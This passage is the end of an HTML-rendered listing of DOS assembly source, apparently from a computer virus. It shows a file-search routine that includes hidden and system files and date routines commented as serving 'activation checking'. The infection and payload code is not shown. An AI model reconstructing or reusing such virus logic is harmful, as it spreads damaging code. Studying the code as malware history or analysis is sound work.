        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Find the file</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">findfirst</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nameptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">27h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*       Get the day off the system for activation checking</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc5">get_day</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02Ah</span><span class="sc0">                 </span><span class="sc1">; DOS get date function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; Copy day into AL</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">                             </span><span class="sc1">; Sign-extend AL into AX</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Get back to caller</span><span class="sc0">
</span><span class="sc1">;*************************************************************************</span><span class="sc0">
</span><span class="sc1">;*      Get the month off the system for activation checking</span><span class="sc0">
</span><span class="sc1">;*************************************************************************</span><span class="sc0">

</span><span class="sc5">get_month</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02Ah</span><span class="sc0">                 </span><span class="sc1">; DOS get date function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; Copy month into AL</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">                             </span><span class="sc1">; Sign-extend AL into AX</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Get back to caller</span><span class="sc0">


</span><span class="sc5">endit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">begin</span><span class="sc0">

</span></div></body>
</html>
